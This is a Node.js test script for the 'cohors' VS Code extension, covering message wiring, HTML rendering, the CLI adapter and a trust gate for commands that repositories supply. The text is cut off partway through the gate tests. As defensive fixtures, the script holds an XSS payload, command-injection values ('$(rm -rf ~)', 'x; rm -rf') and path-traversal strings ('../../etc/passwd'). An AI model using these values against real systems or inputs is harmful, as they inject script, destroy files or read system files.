#!/usr/bin/env node
// Checks for the extension that need nothing but Node.
//
//   node dev/check.js                                   # fixtures + stand-in binary
//   node dev/check.js --bin <path to cohors> [--root <dir>]...   # also the real CLI
//
// What it covers:
//   1. wiring   every control the view emits is handled by main.js, every
//               message main.js sends is handled by the host, and
//               package.json agrees with the code;
//   2. view     every page, in every scenario the preview offers, renders
//               well-formed HTML with cohors's numbers in it, and nothing a
//               repository supplies can inject markup;
//   3. adapter  src/cohors.js and src/agent.js against dev/fake-cohors.js,
//               including the `cohors agent` contract and the failure kinds;
//   4. real     with --bin, the same adapter against a real cohors binary.
//               It prints counts only, never repository names.

const assert = require("assert");
const fs = require("fs");
const os = require("os");
const path = require("path");

const EXT = path.join(__dirname, "..");
const V = require(path.join(EXT, "media", "view.js"));
const Cohors = require(path.join(EXT, "src", "cohors.js"));
const Agent = require(path.join(EXT, "src", "agent.js"));
const Local = require(path.join(EXT, "src", "local.js"));

const read = (rel) => fs.readFileSync(path.join(EXT, rel), "utf8");
const fixture = (name) => JSON.parse(read(`dev/fixtures/${name}.json`));
const clone = (v) => JSON.parse(JSON.stringify(v));

let passed = 0;
const failures = [];
async function check(name, fn) {
  try { await fn(); passed++; console.log(`  ok    ${name}`); }
  catch (e) { failures.push(name); console.log(`  FAIL  ${name}\n        ${String(e && e.message).split("\n").join("\n        ")}`); }
}

/* ───────── helpers ───────── */

const VOID = new Set(["input", "br", "img", "hr", "col", "meta", "link"]);
// Tags must nest and close; a "<" that does not start a tag means something
// was not escaped.
function wellFormed(html, where) {
  const stack = [];
  const re = /<(\/?)([a-zA-Z][a-zA-Z0-9]*)\b[^<>]*?(\/?)>/g;
  let m;
  while ((m = re.exec(html))) {
    const tag = m[2].toLowerCase();
    if (VOID.has(tag) || m[3]) continue;
    if (!m[1]) stack.push(tag);
    else assert.strictEqual(stack.pop(), tag, `${where}: </${tag}> does not match its opening tag`);
  }
  assert.deepStrictEqual(stack, [], `${where}: unclosed tags`);
  assert(!/<(?![/a-zA-Z])/.test(html), `${where}: a bare "<" reached the output`);
}

function demoState() {
  return Object.assign(clone(fixture("host")), {
    status: "ok", overview: fixture("overview"), launchpad: fixture("launchpad"),
    agent: fixture("agent"), local: fixture("local"),
  });
}
function demoUi(extra) {
  return Object.assign({
    page: "overview", q: "", view: "", pick: null, sel: null, runner: "", standupWindow: "week", showDone: false,
    standup: { week: { data: fixture("standup-week") }, today: { data: fixture("standup-today") } },
    devices: fixture("devices"),
  }, extra);
}

// Everything the webview can show for one state: rail, every page, and the
// detail panel for every repository.
function renderAll(state, uiExtra) {
  const out = [];
  const add = (where, sections) => {
    assert(Array.isArray(sections), `${where}: not a list of sections`);
    const ids = sections.map((s) => s.id);
    assert.strictEqual(new Set(ids).size, ids.length, `${where}: duplicate section ids`);
    for (const s of sections) {
      assert(typeof s.html === "string" && s.html.length, `${where}/${s.id}: empty section`);
      wellFormed(s.html, `${where}/${s.id}`);
      assert(!/undefined|NaN|\[object Object\]/.test(s.html), `${where}/${s.id}: a missing value reached the output`);
      out.push(s.html);
    }
    return sections;
  };
  for (const p of V.PAGES) {
    const ui = demoUi(Object.assign({ page: p.id }, uiExtra));
    add(`rail(${p.id})`, V.rail(state, ui));
    add(`page(${p.id})`, V.page(state, ui));
  }
  if (state && state.status === "ok") {
    for (const r of state.overview.repos) add(`detail(${r.name})`, V.detail(state, demoUi({ sel: r.id })));
    for (const v of V.VIEWS) add(`repos view ${v.id}`, V.page(state, demoUi({ page: "repos", view: v.id })));
    add("tasks with finished", V.page(state, demoUi({ page: "tasks", showDone: true })));
    add("standup today", V.page(state, demoUi({ page: "standup", standupWindow: "today" })));
    add("standup loading", V.page(state, demoUi({ page: "standup", standup: {} })));
    add("standup error", V.page(state, demoUi({ page: "standup", standup: { week: { error: "boom" } } })));
    add("devices loading", V.page(state, demoUi({ page: "devices", devices: null })));
  }
  return out.join("\n");
}

const text = (html) => html.replace(/<[^>]*>/g, " ").replace(/&amp;/g, "&").replace(/&#39;/g, "'").replace(/&quot;/g, '"').replace(/\s+/g, " ");

/* ───────── 1. wiring ───────── */

async function wiring() {
  console.log("\nwiring");
  const view = read("media/view.js"), main = read("media/main.js"), host = read("src/extension.js");
  const pkg = JSON.parse(read("package.json"));

  await check("every data-do the view emits has a case in main.js", () => {
    const emitted = new Set([...view.matchAll(/\bdo: "([a-z-]+)"/g)].map((m) => m[1]));
    for (const m of view.matchAll(/data-do="([a-z-]+)"/g)) emitted.add(m[1]);
    const handled = new Set([...main.matchAll(/case "([a-z-]+)":/g)].map((m) => m[1]));
    const missing = [...emitted].filter((d) => !handled.has(d));
    assert.deepStrictEqual(missing, [], `unhandled: ${missing.join(", ")}`);
    assert(emitted.size > 30, "expected the view to emit its controls");
  });

  await check("every message main.js sends is handled by the host", () => {
    const sent = new Set([...main.matchAll(/send\(\{ type: "([A-Za-z]+)"/g)].map((m) => m[1]));
    const handled = new Set([...host.matchAll(/case "([A-Za-z]+)":/g)].map((m) => m[1]));
    const missing = [...sent].filter((t) => !handled.has(t));
    assert.deepStrictEqual(missing, [], `unhandled: ${missing.join(", ")}`);
    assert(sent.size > 20, "expected main.js to send its messages");
  });

  await check("every message the host posts is handled by main.js", () => {
    const posted = new Set([...host.matchAll(/post\(\{ type: "([a-z-]+)"/g)].map((m) => m[1]));
    const handled = new Set([...main.matchAll(/case "([a-z-]+)":/g)].map((m) => m[1]));
    const missing = [...posted].filter((t) => !handled.has(t));
    assert.deepStrictEqual(missing, [], `unhandled: ${missing.join(", ")}`);
  });

  await check("package.json commands, settings and files match the code", () => {
    const contributed = pkg.contributes.commands.map((c) => c.command).sort();
    const registered = [...host.matchAll(/registerCommand\("([a-zA-Z.]+)"/g)].map((m) => m[1]).sort();
    assert.deepStrictEqual(contributed, registered);
    const settings = Object.keys(pkg.contributes.configuration.properties);
    for (const m of host.matchAll(/cfg\(\)\.get\("([a-zA-Z]+)"/g)) assert(settings.includes(`cohors.${m[1]}`), `setting cohors.${m[1]} is not contributed`);
    for (const s of settings) assert(host.includes(`"${s.replace("cohors.", "")}"`), `${s} is contributed but never read`);
    assert.strictEqual(pkg.name, "cohors");
    assert(fs.existsSync(path.join(EXT, pkg.main)), "main entry is missing");
    assert(fs.existsSync(path.join(EXT, pkg.contributes.viewsContainers.activitybar[0].icon)), "activity bar icon is missing");
    for (const f of ["cohors-light.svg", "cohors-dark.svg", "codicon.ttf", "codicon.css", "main.css", "view.js", "main.js"]) {
      assert(fs.existsSync(path.join(EXT, "media", f)), `media/${f} is missing`);
    }
  });

  await check("no source file reaches outside extension/", () => {
    for (const f of fs.readdirSync(path.join(EXT, "src"))) {
      for (const m of read(`src/${f}`).matchAll(/require\("([^"]+)"\)/g)) {
        if (!m[1].startsWith(".")) continue;
        const target = path.resolve(EXT, "src", m[1]);
        assert(target.startsWith(EXT + path.sep), `src/${f} requires ${m[1]}`);
        assert(fs.existsSync(target + ".js") || fs.existsSync(target), `src/${f} requires a missing file ${m[1]}`);
      }
    }
  });

  await check("every codicon the view names is in the bundled font", () => {
    const css = read("media/codicon.css");
    const names = new Set();
    for (const m of view.matchAll(/(?:ico|iconBtn|heading)\("([a-z0-9-]+)"/g)) names.add(m[1]);
    for (const m of view.matchAll(/icon: "([a-z0-9-]+)"/g)) names.add(m[1]);
    const missing = [...names].filter((n) => !css.includes(`codicon-${n}:before`));
    assert.deepStrictEqual(missing, []);
  });
}

/* ───────── 2. view ───────── */

async function view() {
  console.log("\nview");
  const state = demoState();
  const f = state.overview.figures;

  await check("the demo fleet renders on every page, well-formed", () => {
    const html = renderAll(state);
    assert(html.length > 20000, "suspiciously little output");
  });

  await check("Overview shows cohors's own numbers and sentences", () => {
    const html = V.page(state, demoUi()).map((s) => s.html).join("\n");
    const t = text(html);
    assert(t.includes(state.overview.headline), "headline");
    for (const a of state.overview.actions) { assert(t.includes(a.title), `action title: ${a.title}`); assert(t.includes(a.why), "action why"); assert(t.includes(a.label), "action label"); }
    const figs = [...html.matchAll(/<div class="v">([\d,]+)<\/div>/g)].map((m) => Number(m[1].replace(/,/g, "")));
    assert.deepStrictEqual(figs, [f.not_backed_up, f.stashes, f.uncommitted_files, f.stale_fetch_repos, f.open_tasks, f.commits_week]);
    for (const r of state.overview.repos) assert(t.includes(r.name), `repository ${r.name}`);
    const risk = V.page(state, demoUi()).find((s) => s.id === "risk").html;
    assert.strictEqual((risk.match(/<tr data-repo=/g) || []).length, f.at_risk, "one risk row per at-risk repository");
    for (const w of state.overview.work) assert(t.includes(w.name));
    for (const c of state.overview.commits) assert(html.includes(`<span class="num">${c.count}</span>`));
  });

  await check("saved views agree with the figures cohors reports", () => {
    const n = (id) => state.overview.repos.filter(V.VIEWS.find((v) => v.id === id).test).length;
    assert.strictEqual(n("risk"), f.at_risk);
    assert.strictEqual(n("unpublished"), f.unpublished);
    assert.strictEqual(n("stash"), f.stash_repos);
    assert.strictEqual(n("dirty"), f.dirty_repos);
    assert.strictEqual(n("stale"), f.stale_fetch_repos);
  });

  await check("severity is a shape with a label, on every row", () => {
    const all = V.page(state, demoUi()).find((s) => s.id === "all").html;
    const marks = all.match(/<span class="mark (risk|warn|note|ok)" role="img" aria-label="[^"]+"/g) || [];
    assert.strictEqual(marks.length, state.overview.repos.length);
    for (const sev of Object.keys(V.SEVERITY)) assert(/class="mark (risk|warn|note|ok)"/.test(V.mark(sev)));
  });

  await check("the Repositories filter, views and pick narrow the table", () => {
    const m = V.model(state);
    assert.strictEqual(V.filterRepos(m, demoUi({ q: "PAY" })).length, 1);
    assert.strictEqual(V.filterRepos(m, demoUi({ view: "risk" })).length, f.at_risk);
    assert.strictEqual(V.filterRepos(m, demoUi({ pick: { label: "x", ids: [state.overview.repos[0].id] } })).length, 1);
    const none = V.page(state, demoUi({ page: "repos", q: "zzzz" })).find((s) => s.id === "table").html;
    assert(none.includes("No repository matches"));
    // The filter input's section must not depend on the data, or a refresh would eat the caret.
    const a = V.page(state, demoUi({ page: "repos" })).find((s) => s.id === "filter").html;
    const b = V.page(state, demoUi({ page: "repos", q: "pay", view: "risk" })).find((s) => s.id === "filter").html;
    assert.strictEqual(a, b);
  });

  await check("the detail panel shows state, reasons, flows, agents, tasks and sessions", () => {
    const web = state.overview.repos.find((r) => r.name === "web-app");
    const html = V.detail(state, demoUi({ sel: web.id })).map((s) => s.html).join("\n");
    const t = text(html);
    for (const reason of web.reasons) assert(t.toLowerCase().includes(reason.toLowerCase()), reason);
    assert(html.includes('data-do="flow"') && html.includes('data-do="agent"') && html.includes('data-do="task"'));
    assert(html.includes('data-do="open"') && html.includes('data-new="1"') && html.includes('data-do="terminal"'));
    assert(t.includes("Accessibility audit") && t.includes("Blocked"));
    const pay = state.overview.repos.find((r) => r.name === "payments");
    const p = V.detail(state, demoUi({ sel: pay.id })).map((s) => s.html).join("\n");
    assert(text(p).includes("Resume"), "a linked task offers Resume");
    assert(p.includes('data-do="resume"'), "session history is listed");
    assert(p.includes('data-do="link"'));
    const bare = state.overview.repos.find((r) => r.name === "cli-tools");
    const d = V.detail(state, demoUi({ sel: bare.id })).map((s) => s.html).join("\n");
    assert(d.includes('data-kind="setup-repo"') && text(d).includes("Detected scripts"));
    assert.deepStrictEqual(V.detail(state, demoUi({ sel: "nope" })), []);
  });

  await check("Tasks covers the board, tasks, flows, setup, activity, runners and the workspace", () => {
    const secs = V.page(state, demoUi({ page: "tasks" }));
    assert.deepStrictEqual(secs.map((s) => s.id), ["top", "focus", "tasks", "flows", "unset", "activity", "runners", "workspace"]);
    const html = secs.map((s) => s.html).join("\n");
    const t = text(html);
    assert(html.includes('data-kind="plan-day"') && html.includes('data-do="focus"'));
    assert(html.includes('<select id="runner"'));
    for (const r of state.agent.runners) assert(t.includes(r.label));
    assert(t.includes("gemini was not found on your PATH"), "an unavailable runner says why");
    assert(t.includes("This workspace: payments"), "the open folder gets its getting-started steps");
  });

  await check("Tasks: one setup button per repository that is not set up", () => {
    const unset = V.page(state, demoUi({ page: "tasks" })).find((s) => s.id === "unset").html;
    const expected = state.launchpad.repos.filter((e) => !e.configured).length;
    assert.strictEqual((unset.match(/data-kind="setup-repo"/g) || []).length, expected);
    const finished = V.page(state, demoUi({ page: "tasks", showDone: true })).find((s) => s.id === "tasks").html;
    assert(text(finished).includes("Rotate the webhook signing secret"));
    const open = V.page(state, demoUi({ page: "tasks" })).find((s) => s.id === "tasks").html;
    assert(!text(open).includes("Rotate the webhook signing secret"), "finished tasks are hidden by default");
  });

  await check("Standup lists commits by repository and explains its empty states", () => {
    const week = fixture("standup-week");
    const html = V.page(state, demoUi({ page: "standup" })).map((s) => s.html).join("\n");
    for (const g of week.groups) for (const c of g.commits) assert(html.includes(c.short_id));
    assert(text(html).includes(`${week.total} commits by ${week.author}`));
    const noAuthor = V.page(state, demoUi({ page: "standup", standup: { week: { data: { window: "this week", author: null, total: 0, groups: [] } } } }));
    assert(text(noAuthor.map((s) => s.html).join("")).includes("git config user.email"));
    const none = V.page(state, demoUi({ page: "standup", standupWindow: "today", standup: { today: { data: { window: "today", author: "a@b.c", total: 0, groups: [] } } } }));
    assert(text(none.map((s) => s.html).join("")).includes("No commits by a@b.c today"));
  });

  await check("problems say what is wrong and how to fix it", () => {
    const base = clone(fixture("host"));
    const missing = Object.assign({}, base, { status: "missing", problem: { message: "cohors was not found on your PATH.", configured: false } });
    const t1 = text(renderAll(missing));
    assert(t1.includes("not installed") && t1.includes("brew install") && t1.includes("pip install cohors") && t1.includes("cohors.binaryPath") && t1.includes("Try again"));
    const badPath = Object.assign({}, base, { status: "missing", problem: { message: "The cohors.binaryPath setting points at /x, which is not an executable file.", configured: true } });
    assert(text(renderAll(badPath)).includes("does not point at cohors"));
    const error = Object.assign({}, base, { status: "error", problem: { kind: "failed", message: "could not read the config file", detail: "error: could not read the config file\n  line 2" } });
    const t3 = text(renderAll(error));
    assert(t3.includes("could not read your repositories") && t3.includes("could not read the config file") && t3.includes("line 2"));
    assert(text(V.page(null, demoUi()).map((s) => s.html).join("")).includes("Reading your repositories"));
    wellFormed(V.rail(null, demoUi()).map((s) => s.html).join(""), "rail(loading)");
  });

  await check("an empty fleet, no agent support, no runner and an untrusted workspace all render", () => {
    const empty = demoState();
    for (const k of Object.keys(empty.overview.figures)) empty.overview.figures[k] = 0;
    Object.assign(empty.overview, { headline: "No repositories.", repos: [], actions: [], work: [], commits: [], activity: [], focus: [] });
    Object.assign(empty.launchpad, { repos: [], recent_activity: [] });
    empty.launchpad.board.focus = [];
    const t = text(renderAll(empty));
    assert(t.includes("No repositories found") && t.includes("Use this workspace's folders as roots"));

    const noAgent = demoState();
    noAgent.agent = { runners: [], prompts: [], error: "This version of cohors has no `cohors agent` command." };
    const h = renderAll(noAgent);
    assert(text(h).includes("has no `cohors agent` command"));
    assert(!/<button type="button" class="btn primary" data-do="prompt"[^>]*data-kind="plan-day"(?![^>]*disabled)/.test(h), "agent buttons are disabled without agent support");

    const noRunner = demoState();
    noRunner.agent.runners.forEach((r) => { r.available = false; });
    assert(text(renderAll(noRunner)).includes("No agent runner is installed"));

    const untrusted = demoState();
    untrusted.trusted = false;
    const u = renderAll(untrusted);
    assert(text(u).includes("not trusted"));
    assert(!/data-do="(agent|task|focus)"(?![^>]*disabled)/.test(u), "repo-declared agents and tasks are disabled when untrusted");
  });

  await check("nothing a repository supplies can inject markup", () => {
    const evil = `<img src=x onerror=alert(1)>"'&<script>`;
    const poison = (v) => {
      if (typeof v === "string") return evil;
      if (Array.isArray(v)) return v.map(poison);
      if (v && typeof v === "object") { const o = {}; for (const k of Object.keys(v)) o[k] = poison(v[k]); return o; }
      return v;
    };
    const state2 = demoState();
    const keepIds = (list) => list.map((x, i) => Object.assign(poison(x), { id: `id-${i}` }));
    state2.overview.repos = state2.overview.repos.map((r, i) => Object.assign(poison(r), { id: `id-${i}`, path: `/p/${i}`, severity: r.severity }));
    state2.overview.actions = poison(state2.overview.actions);
    state2.overview.work = poison(state2.overview.work);
    state2.overview.commits = poison(state2.overview.commits);
    state2.overview.headline = evil;
    state2.overview.roots = [evil];
    state2.launchpad.repos = state2.launchpad.repos.map((e, i) => Object.assign(poison(e), { id: `id-${i}`, configured: e.configured }));
    state2.launchpad.board.focus = keepIds(state2.launchpad.board.focus);
    state2.launchpad.recent_activity = poison(state2.launchpad.recent_activity);
    state2.agent = poison(state2.agent); state2.agent.error = null;
    state2.agent.runners.forEach((r) => { r.available = true; });
    state2.agent.prompts.forEach((p) => { p.needs_repo = true; });
    state2.local = { threads: {}, sessions: { "id-4": [{ id: evil, title: evil, turns: 1, branch: evil, ts: 1 }] } };
    state2.binary = poison(state2.binary);
    const ui = { standup: { week: { data: poison(fixture("standup-week")) }, today: { error: evil } }, devices: poison(fixture("devices")) };
    ui.devices.android.available = true; ui.devices.ios.available = true;
    const html = renderAll(state2, ui);
    assert(!/<img|<script/i.test(html), "markup from data reached the output");
    assert(html.includes("&lt;img src=x onerror=alert(1)&gt;"), "the hostile text is shown, escaped");
    const problem = V.page({ status: "error", problem: { message: evil, detail: evil, kind: "failed" } }, demoUi()).map((s) => s.html).join("");
    assert(!/<img|<script/i.test(problem));
  });

  await check("the brand mark is drawn from the block rows", () => {
    const svg = V.markSvg();
    assert((svg.match(/<rect /g) || []).length === 80);
    assert(svg.includes('viewBox="0 0 18 12"') && svg.includes('opacity=".45"'));
    const file = read("media/cohors.svg");
    assert(file.includes(V.markRects()), "media/cohors.svg is out of date: run node dev/make-mark.js");
  });

  await check("ages and paths read naturally", () => {
    const now = 1_000_000_000;
    assert.strictEqual(V.age(now - 1800, now), "1h");
    assert.strictEqual(V.age(now - 5 * 3600, now), "5h");
    assert.strictEqual(V.age(now - 3 * 86400, now), "3d");
    assert.strictEqual(V.age(now - 21 * 86400, now), "3w");
    assert.strictEqual(V.age(now - 120 * 86400, now), "4mo");
    assert.strictEqual(V.age(now - 800 * 86400, now), "2y");
    assert.strictEqual(V.age(0, now), "");
    assert.strictEqual(V.tilde("/home/dev/code/app", "/home/dev"), "~/code/app");
    assert.strictEqual(V.tilde("/srv/app", "/home/dev"), "/srv/app");
    assert.strictEqual(V.plural(1, "repository", "repositories"), "1 repository");
    assert.strictEqual(V.plural(2, "repository", "repositories"), "2 repositories");
  });
}

/* ───────── 3. adapter, against the stand-in binary ───────── */

function assertShapes(o, l, s) {
  assert(typeof o.headline === "string" && typeof o.now === "number");
  assert(Array.isArray(o.roots) && Array.isArray(o.actions) && Array.isArray(o.repos) && Array.isArray(o.work) && Array.isArray(o.commits) && Array.isArray(o.activity) && Array.isArray(o.focus));
  for (const k of ["repos", "clean", "at_risk", "unpublished", "unpushed_repos", "unpushed_commits", "not_backed_up", "stashes", "stash_repos", "stale_stash_repos", "uncommitted_files", "dirty_repos", "stale_fetch_repos", "oldest_fetch_days", "open_tasks", "high_tasks", "doing_tasks", "blocked_tasks", "task_repos", "configured_repos", "commits_week", "commits_prev_week", "commits_total", "active_repos"]) {
    assert.strictEqual(typeof o.figures[k], "number", `figures.${k}`);
  }
  assert.strictEqual(o.repos.length, o.figures.repos);
  for (const a of o.actions) {
    assert(typeof a.title === "string" && typeof a.why === "string" && typeof a.label === "string" && typeof a.kind === "string");
    assert(a.verb === null || Cohors.VERBS.includes(a.verb), `unknown verb ${a.verb}`);
    assert(Array.isArray(a.repos) && a.repos.every((id) => o.repos.some((r) => r.id === id)), "an action names a repository the overview does not list");
    assert(Object.keys(V.SEVERITY).includes(a.severity), `unknown severity ${a.severity}`);
  }
  for (const r of o.repos) {
    assert(typeof r.id === "string" && typeof r.name === "string" && typeof r.branch === "string");
    assert(Object.keys(V.SEVERITY).includes(r.severity), `unknown severity ${r.severity}`);
    assert(typeof r.at_risk === "boolean" && Array.isArray(r.reasons) && typeof r.has_remote === "boolean");
    for (const k of ["ahead", "behind", "staged", "modified", "untracked", "conflicted", "stashes", "tasks_open"]) assert.strictEqual(typeof r[k], "number", `repo.${k}`);
    assert(r.action === null || (typeof r.action.label === "string" && (r.action.verb === null || Cohors.VERBS.includes(r.action.verb))));
    assert(r.commit === null || (typeof r.commit.short_id === "string" && typeof r.commit.summary === "string" && typeof r.commit.timestamp === "number"));
  }
  assert.strictEqual(o.repos.filter((r) => r.at_risk).length, o.figures.at_risk);

  assert(Array.isArray(l.repos) && Array.isArray(l.board.focus) && Array.isArray(l.recent_activity));
  assert.strictEqual(l.repos.length, o.repos.length, "launchpad lists every repository the overview does");
  for (const e of l.repos) {
    assert(o.repos.some((r) => r.id === e.id), "a launchpad entry has no matching repository");
    assert(typeof e.configured === "boolean");
    if (e.configured) assert(e.contribution && Array.isArray(e.contribution.flows) && Array.isArray(e.contribution.agents) && Array.isArray(e.contribution.tasks));
    for (const f of [...((e.contribution || {}).flows || []), ...(e.detected_flows || [])]) assert(typeof f.id === "string" && typeof f.run === "string");
  }
  assert.strictEqual(l.repos.filter((e) => e.configured).length, o.figures.configured_repos);

  assert(typeof s.window === "string" && typeof s.total === "number" && Array.isArray(s.groups));
  assert.strictEqual(s.groups.reduce((n, g) => n + g.commits.length, 0), s.total);
  for (const g of s.groups) for (const c of g.commits) assert(typeof c.short_id === "string" && typeof c.summary === "string" && typeof c.timestamp === "number");
}

async function adapter() {
  console.log("\nadapter (dev/fake-cohors.js)");
  const fake = path.join(__dirname, "fake-cohors.js");
  let config = { binaryPath: fake, roots: [] };
  const cli = Cohors.create(() => config);
  const agent = Agent.create(cli);

  await check("finds the configured binary and reads the three JSON commands", async () => {
    assert.strictEqual((await cli.locate()).path, fake);
    const [o, l, s, today] = await Promise.all([cli.overview(), cli.launchpad(), cli.standup(false), cli.standup(true)]);
    assertShapes(o, l, s);
    assert.strictEqual(today.window, "today");
    assert((await cli.standupMarkdown(true)).startsWith("## Standup"));
    assert((await cli.version()).startsWith("cohors "));
  });

  await check("roots become --root flags before the subcommand", async () => {
    config = { binaryPath: fake, roots: ["/a b", "~/c"] };
    assert.deepStrictEqual(cli.globalArgs(), ["--root", "/a b", "--root", path.join(os.homedir(), "c")]);
    assert.deepStrictEqual((await cli.overview()).roots, ["/a b", path.join(os.homedir(), "c")]);
    config = { binaryPath: fake, roots: [] };
  });

  await check("bulk actions are argument arrays with a JSON selector", () => {
    assert.deepStrictEqual(cli.actionArgs("fetch", { ids: ["/code/it's here", "b"] }), ["fetch", "--select", '{"ids":["/code/it\'s here","b"]}']);
    assert.deepStrictEqual(cli.actionArgs("push", { all: true }, { dryRun: true }), ["push", "--select", '{"all":true}', "--dry-run"]);
    assert.deepStrictEqual(cli.actionArgs("commit", { ids: ["a"] }, { message: "fix: $(rm -rf ~)" }), ["commit", "--select", '{"ids":["a"]}', "-m", "fix: $(rm -rf ~)"]);
    assert.throws(() => cli.actionArgs("commit", { ids: ["a"] }), /needs a message/);
    assert.throws(() => cli.actionArgs("fetch", { ids: [] }), /No repositories/);
    assert.throws(() => cli.actionArgs("rebase", { ids: ["a"] }), /Unknown action/);
  });

  await check("cohors agent runners / prompts follow the contract", async () => {
    const runners = await agent.runners();
    assert.deepStrictEqual(runners.map((r) => r.id), ["claude-code", "codex", "gemini-cli", "agy"]);
    for (const r of runners) {
      assert(typeof r.label === "string" && typeof r.bin === "string" && typeof r.available === "boolean" && typeof r.can_link === "boolean" && typeof r.can_resume === "boolean");
      assert(r.available ? typeof r.path === "string" : typeof r.reason === "string");
    }
    const prompts = await agent.prompts();
    assert.deepStrictEqual(prompts.map((p) => p.id), Agent.PROMPT_KINDS);
    assert.strictEqual(prompts.find((p) => p.id === "plan-day").needs_repo, false);
  });

  await check("cohors agent command builds the right arguments and returns a command to type", async () => {
    assert.deepStrictEqual(agent.commandArgs("setup-repo", { repo: "/r", runner: "codex" }), ["agent", "command", "setup-repo", "--runner", "codex", "--repo", "/r"]);
    assert.deepStrictEqual(agent.commandArgs("plan-day", {}), ["agent", "command", "plan-day"]);
    assert.deepStrictEqual(agent.commandArgs("task", { repo: "/r", task: "fix-ci" }), ["agent", "command", "task", "--repo", "/r", "--task", "fix-ci"]);
    assert.deepStrictEqual(agent.commandArgs("resume", { repo: "/r", session: "6f1c2b7e-3a54-4d1e-9c0f-2b8a7d5e4c31" }), ["agent", "command", "resume", "--repo", "/r", "--session", "6f1c2b7e-3a54-4d1e-9c0f-2b8a7d5e4c31"]);
    assert.throws(() => agent.commandArgs("agent", { repo: "/r" }), /needs --agent/);
    assert.throws(() => agent.commandArgs("task", { repo: "/r", task: "../etc" }), /kebab-case/);
    assert.throws(() => agent.commandArgs("resume", { repo: "/r", session: "x; rm -rf" }), /session id/);
    assert.throws(() => agent.commandArgs("deploy", {}), /Unknown agent command/);

    const r = await agent.command("task", { repo: "/tmp", task: "fix-ci" });
    assert.strictEqual(r.cwd, "/tmp");
    assert.strictEqual(r.runner, "claude-code");
    assert(r.command.startsWith("claude ") && r.label.includes("Claude Code") && r.linked === true && typeof r.session === "string");
    const plan = await agent.command("plan-day", { runner: "codex" });
    assert(plan.command.startsWith("codex ") && plan.prompt_file.endsWith("plan-day.md"));
    const resumed = await agent.command("resume", { repo: "/tmp", session: "6f1c2b7e-3a54-4d1e-9c0f-2b8a7d5e4c31" });
    assert(resumed.command.includes("--resume") && resumed.prompt_file === null);
  });

  await check("a failed agent command surfaces cohors's one-line reason", async () => {
    await assert.rejects(agent.command("task", { repo: "/tmp/app", task: "no-such-task" }), (e) => e.kind === "failed" && e.message === 'no task "no-such-task" in app');
    await assert.rejects(agent.command("setup-repo", { repo: "/tmp", runner: "agy" }), (e) => /agy is not installed/.test(e.message));
  });

  await check("failure kinds: missing binary, wrong path, old binary, bad JSON", async () => {
    const gone = Cohors.create(() => ({ binaryPath: "/nonexistent/cohors", roots: [] }));
    const where = await gone.locate();
    assert(where.path === null && where.configured === true && /not an executable file/.test(where.reason));
    await assert.rejects(gone.overview(), (e) => e.kind === "missing");
    await assert.rejects(cli.json(["frobnicate"]), (e) => e.kind === "unsupported");
    await assert.rejects(cli.json(["--version"]), (e) => e.kind === "parse");
  });

  await check("machine-local extras: threads, the pending intent, path containment", () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "cohors-check-"));
    try {
      assert.deepStrictEqual(Local.readThreads(dir), {});
      fs.mkdirSync(path.join(dir, ".principia"));
      fs.writeFileSync(path.join(dir, ".principia", "local.json"), JSON.stringify({ specVersion: 1, threads: { "fix-ci": "abc", bad: 3 } }));
      assert.deepStrictEqual(Local.readThreads(dir), { "fix-ci": "abc" });

      Local.queuePending(dir, "/code/app", { kind: "start", runner: "codex" });
      assert.deepStrictEqual(Local.takePending(dir, "/code/app"), { kind: "start", runner: "codex" });
      assert.strictEqual(Local.takePending(dir, "/code/app"), null, "an intent is claimed once");
      Local.queuePending(dir, "/code/app", { kind: "start" });
      assert.strictEqual(Local.takePending(dir, "/code/other"), null, "another folder does not claim it");

      assert.strictEqual(Local.resolveInside("/r", ".principia/agents/a.md", ".principia"), path.resolve("/r/.principia/agents/a.md"));
      assert.strictEqual(Local.resolveInside("/r", "../../etc/passwd", ".principia"), null);
      assert.strictEqual(Local.resolveInside("/r", "../x"), null);
      assert.strictEqual(Local.resolveInside("/r", "apps/web"), path.resolve("/r/apps/web"));
    } finally { fs.rmSync(dir, { recursive: true, force: true }); }
  });
}

/* ───────── 3b. the gate in front of repository-supplied code ───────── */

async function gateChecks() {
  console.log("\ngate (flows, agents and tasks a repository supplies)");
  const Gate = require(path.join(EXT, "src", "gate.js"));
  const pad = fixture("launchpad");
  const entryOf = (name) => pad.repos.find((e) => e.name === name);
  const repoOf = (name) => ({ name, path: `/home/dev/code/${name}` });

  // A host whose trust and answer the test controls, and a spy for "run".
  function harness(trusted, answer) {
    const h = { trusted, answer, asked: [], ran: [] };
    h.gate = Gate.create({
      isTrusted: () => h.trusted,
      confirm: async (request) => { h.asked.push(request); return h.answer; },
    });
    h.run = (cwd, command, name) => h.ran.push({ cwd, command, name });
    h.flow = (name, flowId, entry) => h.gate.flow({ repo: repoOf(name), entry: entry || entryOf(name), flowId, run: h.run });
    return h;
  }

  await check("a detected flow is refused when the workspace is not trusted", async () => {
    const h = harness(false, true);
    assert(entryOf("cli-tools").detected_flows.some((f) => f.id === "cargo-check"), "fixture should have a detected flow");
    const r = await h.flow("cli-tools", "cargo-check");
    assert.strictEqual(r.ok, false);
    assert.strictEqual(r.reason, "untrusted");
    assert(/not trusted/.test(r.message));
    assert.strictEqual(h.ran.length, 0, "nothing may run");
    assert.strictEqual(h.asked.length, 0, "an untrusted window is not even asked");
  });

  await check("a declared flow is refused when the workspace is not trusted", async () => {
    const h = harness(false, true);
    const r = await h.flow("payments", "dev");
    assert(r.ok === false && r.reason === "untrusted" && h.ran.length === 0 && h.asked.length === 0);
  });

  await check("trusted: the exact command and folder are shown before the first run", async () => {
    const h = harness(true, true);
    const r = await h.flow("cli-tools", "cargo-check");
    assert(r.ok && r.asked);
    assert.strictEqual(h.asked.length, 1);
    assert.strictEqual(h.asked[0].message, "Run `cargo check` in /home/dev/code/cli-tools?");
    assert(/detected from the repository's own scripts/.test(h.asked[0].detail));
    assert.deepStrictEqual(h.ran, [{ cwd: "/home/dev/code/cli-tools", command: "cargo check", name: "cli-tools: cargo check" }]);
    const declared = await h.flow("payments", "dev");
    assert(declared.ok && /declared in its \.principia\/repo\.json/.test(h.asked[1].detail));
    assert(h.asked[1].message.includes("`docker compose up -d && cargo run`") && h.asked[1].message.includes("/home/dev/code/payments"));
  });

  await check("an approval is remembered per repository and per command, for the session", async () => {
    const h = harness(true, true);
    await h.flow("cli-tools", "cargo-check");
    await h.flow("cli-tools", "cargo-check");
    assert.strictEqual(h.asked.length, 1, "the same command in the same repository is asked once");
    assert.strictEqual(h.ran.length, 2);
    await h.flow("cli-tools", "cargo-test");
